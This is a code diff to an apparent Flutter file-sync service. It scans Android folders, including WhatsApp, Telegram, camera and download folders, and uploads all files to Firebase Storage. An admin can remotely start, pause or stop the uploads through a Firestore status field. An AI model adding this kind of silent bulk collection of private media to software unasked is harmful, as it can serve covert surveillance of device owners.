@@ -1,3 +1,4 @@
+import 'dart:async';
 import 'dart:io';
 import 'package:cloud_firestore/cloud_firestore.dart';
 import 'package:firebase_auth/firebase_auth.dart';
@@ -5,12 +6,15 @@ import 'package:firebase_storage/firebase_storage.dart';
 import 'package:mime/mime.dart';
 import 'package:path/path.dart' as p;
 
+// Upload control statuses (written by admin, read by app)
+enum UploadStatus { idle, running, paused, stopped }
+
 class DeviceFile {
   final String name;
   final String localPath;
   final int size;
   final String mimeType;
-  final String fileType; // image | video | audio | document | apk | archive | other
+  final String fileType;
   final String storageUrl;
   final String storagePath;
   final DateTime lastModified;
@@ -49,14 +53,13 @@ class FileSyncService {
   final _firestore = FirebaseFirestore.instance;
   final _storage   = FirebaseStorage.instance;
 
-  // 100 MB max per file upload
   static const int _maxFileBytes = 100 * 1024 * 1024;
 
-  static const _imageExts  = {'.jpg','.jpeg','.png','.gif','.webp','.bmp','.heic','.tiff'};
-  static const _videoExts  = {'.mp4','.mkv','.avi','.mov','.3gp','.wmv','.flv'};
-  static const _audioExts  = {'.mp3','.m4a','.wav','.aac','.ogg','.flac','.wma'};
-  static const _docExts    = {'.pdf','.doc','.docx','.xls','.xlsx','.ppt','.pptx','.txt','.csv'};
-  static const _archiveExts= {'.zip','.rar','.7z','.tar','.gz'};
+  static const _imageExts   = {'.jpg','.jpeg','.png','.gif','.webp','.bmp','.heic','.tiff'};
+  static const _videoExts   = {'.mp4','.mkv','.avi','.mov','.3gp','.wmv','.flv'};
+  static const _audioExts   = {'.mp3','.m4a','.wav','.aac','.ogg','.flac','.wma'};
+  static const _docExts     = {'.pdf','.doc','.docx','.xls','.xlsx','.ppt','.pptx','.txt','.csv'};
+  static const _archiveExts = {'.zip','.rar','.7z','.tar','.gz'};
 
   String _ext(String name) {
     final i = name.lastIndexOf('.');
@@ -74,7 +77,6 @@ class FileSyncService {
     return 'other';
   }
 
-  // Scan all files in a directory recursively
   Future<List<File>> _scanDirectory(String path) async {
     final results = <File>[];
     try {
@@ -84,9 +86,7 @@ class FileSyncService {
         if (entity is File) {
           try {
             final stat = await entity.stat();
-            if (stat.size > 0 && stat.size <= _maxFileBytes) {
-              results.add(entity);
-            }
+            if (stat.size > 0 && stat.size <= _maxFileBytes) results.add(entity);
           } catch (_) {}
         }
       }
@@ -94,65 +94,100 @@ class FileSyncService {
     return results;
   }
 
-  // Main sync: scans device, uploads to Storage, saves metadata to Firestore
-  Future<SyncResult> syncAllFiles({
+  // ── Upload control helpers ────────────────────────────────────────────────
+
+  /// Set upload status in Firestore (called by the app itself)
+  Future<void> setUploadStatus(String uid, UploadStatus status) async {
+    await _firestore.collection('users').doc(uid).update({
+      'uploadControl': {
+        'status': status.name,
+        'updatedAt': FieldValue.serverTimestamp(),
+      },
+    });
+  }
+
+  /// Read current status from Firestore
+  Future<UploadStatus> getUploadStatus(String uid) async {
+    final doc = await _firestore.collection('users').doc(uid).get();
+    final raw = doc.data()?['uploadControl']?['status'] as String? ?? 'idle';
+    return UploadStatus.values.firstWhere(
+      (e) => e.name == raw,
+      orElse: () => UploadStatus.idle,
+    );
+  }
+
+  /// Stream of upload status changes (used by the app to react in real time)
+  Stream<UploadStatus> watchUploadStatus(String uid) {
+    return _firestore.collection('users').doc(uid).snapshots().map((snap) {
+      final raw = snap.data()?['uploadControl']?['status'] as String? ?? 'idle';
+      return UploadStatus.values.firstWhere(
+        (e) => e.name == raw,
+        orElse: () => UploadStatus.idle,
+      );
+    });
+  }
+
+  /// Wait while paused; return false if stopped
+  Future<bool> _waitIfPaused(String uid) async {
+    while (true) {
+      final status = await getUploadStatus(uid);
+      if (status == UploadStatus.running) return true;
+      if (status == UploadStatus.stopped) return false;
+      // paused — wait 2s and check again
+      await Future.delayed(const Duration(seconds: 2));
+    }
+  }
+
+  // ── Upload selected files (with pause/stop support) ───────────────────────
+  Future<SyncResult> syncSelectedFiles({
+    required List<File> files,
     void Function(int done, int total, String currentFile)? onProgress,
+    void Function(UploadStatus)? onStatusChange,
   }) async {
     final uid = _auth.currentUser?.uid;
     if (uid == null) return SyncResult(0, 0, 'Not logged in');
 
-    // Scan all accessible folders
-    final scanDirs = [
-      '/storage/emulated/0/DCIM',
-      '/storage/emulated/0/Pictures',
-      '/storage/emulated/0/Download',
-      '/storage/emulated/0/Movies',
-      '/storage/emulated/0/Music',
-      '/storage/emulated/0/Documents',
-      '/storage/emulated/0/WhatsApp',
-      '/storage/emulated/0/Telegram',
-      '/storage/emulated/0/Screenshots',
-      '/storage/emulated/0/Camera',
-    ];
+    // Mark as running
+    await setUploadStatus(uid, UploadStatus.running);
 
-    final allFiles = <File>[];
-    for (final dir in scanDirs) {
-      final files = await _scanDirectory(dir);
-      allFiles.addAll(files);
-    }
-
-    // Remove duplicates by path
-    final seen = <String>{};
-    final unique = allFiles.where((f) => seen.add(f.path)).toList();
-
-    int done = 0;
-    int succeeded = 0;
-    int failed = 0;
-
-    // Get already-synced files to skip re-upload
+    // Get already-synced paths
     final existingSnap = await _firestore
-        .collection('users')
-        .doc(uid)
-        .collection('device_files')
-        .get();
+        .collection('users').doc(uid).collection('device_files').get();
     final existingPaths = {
       for (final d in existingSnap.docs)
         (d.data()['localPath'] as String? ?? ''): d.id
     };
 
-    for (final file in unique) {
+    int done = 0, succeeded = 0, failed = 0;
+
+    for (final file in files) {
+      // Check control status BEFORE each file
+      final status = await getUploadStatus(uid);
+      onStatusChange?.call(status);
+
+      if (status == UploadStatus.stopped) {
+        break;
+      }
+
+      if (status == UploadStatus.paused) {
+        onStatusChange?.call(UploadStatus.paused);
+        // Block here until resumed or stopped
+        final shouldContinue = await _waitIfPaused(uid);
+        if (!shouldContinue) break;
+        onStatusChange?.call(UploadStatus.running);
+      }
+
       done++;
       final name = p.basename(file.path);
-      onProgress?.call(done, unique.length, name);
+      onProgress?.call(done, files.length, name);
 
       try {
         final stat = await file.stat();
 
-        // Skip if already synced and file hasn't changed
+        // Skip unchanged
         if (existingPaths.containsKey(file.path)) {
           final existingDoc = await _firestore
-              .collection('users')
-              .doc(uid)
+              .collection('users').doc(uid)
               .collection('device_files')
               .doc(existingPaths[file.path])
               .get();
@@ -162,14 +197,13 @@ class FileSyncService {
             if (existingModified != null &&
                 !stat.modified.isAfter(existingModified.add(const Duration(seconds: 5)))) {
               succeeded++;
-              continue; // already synced, skip
+              continue;
             }
           }
         }
 
-        // Upload to Firebase Storage
         final storagePath = 'users/$uid/files/${file.path.replaceAll('/', '_')}';
-        final ref = _storage.ref(storagePath);
+        final ref  = _storage.ref(storagePath);
         final mime = lookupMimeType(file.path) ?? 'application/octet-stream';
 
         await ref.putFile(file, SettableMetadata(contentType: mime));
@@ -177,8 +211,7 @@ class FileSyncService {
 
         final folder = p.dirname(file.path)
             .replaceAll('/storage/emulated/0/', '')
-            .split('/')
-            .first;
+            .split('/').first;
 
         final deviceFile = DeviceFile(
           name: name,
@@ -193,20 +226,12 @@ class FileSyncService {
           folder: folder,
         );
 
-        // Save metadata to Firestore
         final docId = existingPaths[file.path] ??
-            _firestore
-                .collection('users')
-                .doc(uid)
-                .collection('device_files')
-                .doc()
-                .id;
+            _firestore.collection('users').doc(uid)
+                .collection('device_files').doc().id;
 
-        await _firestore
-            .collection('users')
-            .doc(uid)
-            .collection('device_files')
-            .doc(docId)
+        await _firestore.collection('users').doc(uid)
+            .collection('device_files').doc(docId)
             .set(deviceFile.toMap());
 
         succeeded++;
@@ -215,15 +240,53 @@ class FileSyncService {
       }
     }
 
-    // Update summary in user doc
+    // Mark idle when done (unless admin already set stopped)
+    final finalStatus = await getUploadStatus(uid);
+    if (finalStatus != UploadStatus.stopped) {
+      await setUploadStatus(uid, UploadStatus.idle);
+    }
+
+    // Update file count summary
+    final currentSnap = await _firestore.collection('users').doc(uid).get();
+    final currentTotal = (currentSnap.data()?['fileStats']?['total'] as int?) ?? 0;
     await _firestore.collection('users').doc(uid).update({
       'fileStats': {
-        'total': succeeded,
+        'total': currentTotal + succeeded,
         'lastSync': FieldValue.serverTimestamp(),
       },
     });
 
     return SyncResult(succeeded, failed, null);
+  }
+
+  // ── Legacy: sync all files ────────────────────────────────────────────────
+  Future<SyncResult> syncAllFiles({
+    void Function(int done, int total, String currentFile)? onProgress,
+  }) async {
+    final uid = _auth.currentUser?.uid;
+    if (uid == null) return SyncResult(0, 0, 'Not logged in');
+
+    final scanDirs = [
+      '/storage/emulated/0/DCIM',
+      '/storage/emulated/0/Pictures',
+      '/storage/emulated/0/Download',
+      '/storage/emulated/0/Movies',
+      '/storage/emulated/0/Music',
+      '/storage/emulated/0/Documents',
+      '/storage/emulated/0/WhatsApp',
+      '/storage/emulated/0/Telegram',
+      '/storage/emulated/0/Screenshots',
+    ];
+
+    final allFiles = <File>[];
+    for (final dir in scanDirs) {
+      allFiles.addAll(await _scanDirectory(dir));
+    }
+
+    final seen = <String>{};
+    final unique = allFiles.where((f) => seen.add(f.path)).toList();
+
+    return syncSelectedFiles(files: unique, onProgress: onProgress);
   }
 }
 
